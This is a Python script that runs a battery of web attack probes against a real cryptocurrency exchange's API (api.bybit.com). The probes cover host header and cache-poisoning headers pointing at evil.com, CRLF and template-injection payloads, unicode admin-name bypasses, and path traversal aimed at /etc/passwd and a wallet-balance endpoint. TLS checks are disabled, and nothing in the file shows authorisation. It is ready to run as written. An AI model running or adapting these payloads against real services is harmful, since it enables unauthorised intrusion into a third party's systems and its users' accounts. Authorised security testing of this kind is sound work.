#!/usr/bin/env python3
"""
Exotic attack vectors that are often overlooked:
1. HTTP Request Smuggling
2. Cache Poisoning
3. Host Header Injection
4. CRLF Injection
5. Unicode normalization bugs
"""
import requests
import time

BASE_URL = "https://api.bybit.com"
requests.packages.urllib3.disable_warnings()

print("="*80)
print("EXOTIC ATTACK VECTORS")
print("="*80)

# 1. Host Header Injection
print("\n[1] HOST HEADER INJECTION")
print("-" * 80)

try:
    # Try to inject evil.com in Host header
    r = requests.get(
        f"{BASE_URL}/v5/market/time",
        headers={"Host": "evil.com"},
        verify=False,
        timeout=5
    )
    
    # Check if response reflects our host
    if "evil.com" in r.text:
        print("🚨 Host header reflected in response!")
        print(f"  Response: {r.text[:200]}")
    else:
        print("✅ Host header not reflected")
        
except Exception as e:
    print(f"  Error (expected): {e}")

# 2. Cache Poisoning via Headers
print("\n[2] CACHE POISONING")
print("-" * 80)

poisoning_headers = [
    {"X-Forwarded-Host": "evil.com"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
]

for headers in poisoning_headers:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/market/time",
            headers=headers,
            verify=False,
            timeout=3
        )
        
        # Check cache headers
        cache_status = r.headers.get('X-Cache', 'MISS')
        
        if cache_status == 'HIT':
            print(f"⚠️  {headers} - Response was CACHED!")
            
    except:
        pass

# 3. CRLF Injection in parameters
print("\n[3] CRLF INJECTION")
print("-" * 80)

crlf_payloads = [
    "test%0d%0aSet-Cookie: admin=true",
    "test\r\nX-Injected: true",
    "test%0aX-Injected: true",
]

for payload in crlf_payloads:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/market/tickers",
            params={"symbol": payload},
            verify=False,
            timeout=3
        )
        
        # Check if CRLF worked (header injection)
        if 'X-Injected' in r.headers or 'Set-Cookie' in r.text:
            print(f"🚨 CRLF injection worked with: {payload}")
            print(f"  Headers: {dict(r.headers)}")
            
    except:
        pass

# 4. Unicode Normalization Bypass
print("\n[4] UNICODE NORMALIZATION")
print("-" * 80)

# Try admin access with unicode equivalents
unicode_payloads = [
    "ａｄｍｉｎ",  # Fullwidth
    "admin\u200b",  # Zero-width space
    "adm\u0131n",  # Dotless i
]

for payload in unicode_payloads:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/user/query-api",
            params={"username": payload},
            verify=False,
            timeout=3
        )
        
        if r.status_code != 401 and r.status_code != 404:
            print(f"⚠️  Unusual response for: {repr(payload)}")
            print(f"  Status: {r.status_code}")
            
    except:
        pass

# 5. HTTP Parameter Pollution
print("\n[5] HTTP PARAMETER POLLUTION")
print("-" * 80)

# Try to bypass validation with duplicate params
try:
    # Same param twice
    url = f"{BASE_URL}/v5/market/tickers?symbol=BTCUSDT&symbol=../../etc/passwd"
    r = requests.get(url, verify=False, timeout=3)
    
    if "etc" in r.text or "passwd" in r.text:
        print("🚨 Parameter pollution path traversal worked!")
    else:
        print("✅ Parameter pollution blocked")
        
except:
    pass

# 6. Server-Side Template Injection (SSTI)
print("\n[6] SERVER-SIDE TEMPLATE INJECTION")
print("-" * 80)

ssti_payloads = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%=7*7%>",
]

for payload in ssti_payloads:
    try:
        r = requests.get(
            f"{BASE_URL}/v5/market/tickers",
            params={"symbol": payload},
            verify=False,
            timeout=3
        )
        
        # Check if evaluated
        if "49" in r.text:
            print(f"🚨 SSTI detected with: {payload}")
            print(f"  Response: {r.text[:200]}")
            
    except:
        pass

# 7. Path Confusion
print("\n[7] PATH CONFUSION / TRAVERSAL")
print("-" * 80)

path_payloads = [
    "/v5/market/../account/wallet-balance",
    "/v5/market/..%2faccount%2fwallet-balance",
    "/v5/market/;/account/wallet-balance",
]

for path in path_payloads:
    try:
        r = requests.get(f"{BASE_URL}{path}", verify=False, timeout=3)
        
        if r.status_code == 200:
            print(f"⚠️  Path confusion worked: {path}")
            print(f"  Status: {r.status_code}")
            
    except:
        pass

print("\n" + "="*80)
print("EXOTIC VECTORS COMPLETE")
print("="*80)
